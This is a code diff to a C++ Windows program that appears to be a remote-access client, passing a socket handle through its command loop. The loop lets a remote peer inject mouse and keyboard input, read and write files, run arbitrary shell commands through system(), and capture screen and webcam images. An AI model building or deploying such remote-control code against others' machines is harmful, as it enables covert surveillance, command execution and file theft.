@@ -74,7 +74,7 @@ cv::Mat hwnd2mat(HWND hwnd) {
     return src;
 }
 
-void rcv() {
+void rcv(NamedSOCKET * ns) {
     DataType dt;
     HWND DesktopWindow = GetDesktopWindow();
     cv::VideoCapture cap(0);
@@ -84,11 +84,11 @@ void rcv() {
     INPUT in;
 
     while (true) {
-        NH.RecvDataType(&dt);
+        NH.RecvDataType(&dt,ns);
         if (dt.Name == "MousePos") {
             in.type = INPUT_MOUSE;
-            NH.RecvDataT<long>(&in.mi.dx);
-            NH.RecvDataT<long>(&in.mi.dy);
+            NH.RecvDataT<long>(&in.mi.dx,ns);
+            NH.RecvDataT<long>(&in.mi.dy,ns);
             in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
             in.mi.mouseData = 0;
             in.mi.dwExtraInfo = 0;
@@ -111,7 +111,7 @@ void rcv() {
         }
         else if (dt.Name == "MouseDown") {
             int clickType;
-            NH.RecvDataT<int>(&clickType);
+            NH.RecvDataT<int>(&clickType, ns);
             if (clickType == 1) {
                 in.type = INPUT_MOUSE;
                 in.mi.dx = 0;
@@ -186,7 +186,7 @@ void rcv() {
         }
         else if (dt.Name == "MouseUp") {
             int clickType;
-            NH.RecvDataT<int>(&clickType);
+            NH.RecvDataT<int>(&clickType, ns);
             if (clickType == 1) {
                 in.type = INPUT_MOUSE;
                 in.mi.dx = 0;
@@ -265,7 +265,7 @@ void rcv() {
             in.ki.dwExtraInfo = 0;
 
             // Press the "A" key
-            NH.RecvDataT<WORD>(&in.ki.wVk);; // virtual-key code for the "a" key
+            NH.RecvDataT<WORD>(&in.ki.wVk,ns);; // virtual-key code for the "a" key
             in.ki.dwFlags = 0; // 0 for key press
             SendInput(1, &in, sizeof(INPUT));
 
@@ -278,86 +278,85 @@ void rcv() {
             in.ki.dwExtraInfo = 0;
 
             // Press the "A" key
-            NH.RecvDataT<WORD>(&in.ki.wVk);; // virtual-key code for the "a" key
+            NH.RecvDataT<WORD>(&in.ki.wVk,ns);; // virtual-key code for the "a" key
             in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
             SendInput(1, &in, sizeof(INPUT));
         }
         else if (dt.Name == "SendFILE") {
             std::string path;
-            NH.RecvDataT<std::string>(&path);
-            NH.RecvFile(path);
+            NH.RecvDataT<std::string>(&path,ns);
+            NH.RecvFile(path,ns);
         }
         else if (dt.Name == "RecvFILE") {
             std::string path;
-            NH.RecvDataT<std::string>(&path);
-            NH.SendFile(path, 10000);
+            NH.RecvDataT<std::string>(&path,ns);
+            NH.SendFile(path, 10000,ns);
         }
         else if (dt.Name == "CMD") {
             string command;
-            NH.RecvDataT<std::string>(&command);
+            NH.RecvDataT<std::string>(&command,ns);
             system(command.c_str());
         }
         else if (dt.Name == "DesktopIMG")
         {
             //send desktop image
             Dimage = hwnd2mat(DesktopWindow);
-            NH.SendDataType("DesktopIMG");
-            NH.SendCVMat(Dimage);
+            NH.SendDataType("DesktopIMG",ns);
+            NH.SendCVMat(Dimage,ns);
         }
         else if (dt.Name == "CamIMG") {
             //send cam image
             cap.read(Cimage);
-            NH.SendDataType("DesktopIMG");
-            NH.SendCVMat(Dimage);
+            NH.SendDataType("DesktopIMG",ns);
+            NH.SendCVMat(Dimage,ns);
         }
         else if (dt.Name == "RecvPopUp") {
 
             wstring Title;
-            NH.RecvDataT<wstring>(&Title);
+            NH.RecvDataT<wstring>(&Title,ns);
 
             wstring Msg;
-            NH.RecvDataT<wstring>(&Msg);
+            NH.RecvDataT<wstring>(&Msg,ns);
 
             MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONEXCLAMATION);
 
         }
         else if (dt.Name == "RecvPopUpYN") {
             wstring Title;
-            NH.RecvDataT<wstring>(&Title);
+            NH.RecvDataT<wstring>(&Title,ns);
 
             wstring Msg;
-            NH.RecvDataT<wstring>(&Msg);
+            NH.RecvDataT<wstring>(&Msg,ns);
 
             int answer = MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONQUESTION | MB_YESNO);
 
             switch (answer)
             {
             default:
-                NH.SendDataType("MBAwnser");
-                NH.SendDataT<int>(0);
+                NH.SendDataType("MBAwnser",ns);
+                NH.SendDataT<int>(0,ns);
                 break;
             case IDYES:
-                NH.SendDataType("MBAwnser");
-                NH.SendDataT<int>(1);
+                NH.SendDataType("MBAwnser", ns);
+                NH.SendDataT<int>(1, ns);
                 break;
             case IDNO:
-                NH.SendDataType("MBAwnser");
-                NH.SendDataT<int>(0);
+                NH.SendDataType("MBAwnser", ns);
+                NH.SendDataT<int>(0, ns);
                 break;
             }
         }
         else if (dt.Name == "ConsoleMessage") {
             string s;
-            NH.RecvDataT<string>(&s);
+            NH.RecvDataT<string>(&s, ns);
             printf(s.c_str());
             printf("\n");
         }
         else if (dt.Name == "DataTypeList") {
-            NH.RecvTypeList();
+            NH.RecvTypeList(ns);
         }
         else if (dt.Name == "Disconnect") {
-            NH.DisConnect();
-            NH.DefaultInitConnect();
+            NH.DisConnect( ns);
         }
         else {
             //printf("Invalid Packet Recvied\n");
@@ -369,21 +368,10 @@ void rcv() {
 
 int main()
 {
-    thread recvThread;
-
+    NH.RecvFunct = &rcv;
     if (NH.DefaultInitConnect()) {
-        recvThread = thread(rcv);
-        for(int i=0; i<5; i++)
-        {
-            NH.SendDataType("ConsoleMessage");
-            NH.SendDataT<string>("test send.");
-        }
         //system("pause");
     }
-
-    recvThread.join();
-
-
 
     return 0;
 }
